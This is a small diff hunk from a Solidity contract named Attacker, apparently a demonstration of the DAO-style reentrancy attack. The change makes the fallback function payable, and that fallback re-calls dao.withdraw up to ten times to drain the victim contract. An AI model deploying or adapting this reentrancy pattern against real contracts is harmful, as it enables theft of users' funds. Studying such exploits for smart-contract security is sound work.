@@ -32,7 +32,7 @@ contract Attacker {
         dao.withdraw(amount);
     }
 
-    function() {
+    function()payable {
         if(stack++ < 10) {
             dao.withdraw(amount);
         }
